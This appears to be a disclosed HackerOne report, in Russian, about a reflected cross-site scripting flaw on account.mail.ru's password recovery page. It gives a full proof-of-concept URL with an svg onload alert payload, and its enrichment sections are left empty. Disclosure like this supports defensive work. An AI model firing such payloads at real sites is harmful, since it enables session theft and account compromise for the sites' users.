---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '360787'
original_report_id: '360787'
title: '[account.mail.ru] XSS на странице восстановления пароля'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mailru
created_at: '2018-06-01T13:14:51.397Z'
disclosed_at: '2018-07-31T14:53:47.234Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: account.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [account.mail.ru] XSS на странице восстановления пароля

## Metadata

- HackerOne Report ID: 360787
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mailru
- Disclosed At: 2018-07-31T14:53:47.234Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

При генерации формы восстановления пароля значение email подставляется туда как есть:

https://account.mail.ru/recovery/support?email=%3Csvg%20onload=alert(document.domain)%3E

Domain, site, application
--
https://account.mail.ru/recovery/support

Testing environment
--
Firefox 60.0
Chrome 66.0

Steps to reproduce
--
Открыть https://account.mail.ru/recovery/support?email=%3Csvg%20onload=alert(document.domain)%3E

Actual results
--
XSS

Expected results, security impact description and recommendations
--
Фильтровать теги

PoC, exploit code, screenshots, video, references, additional resources
--
{F303978}

## Impact

XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
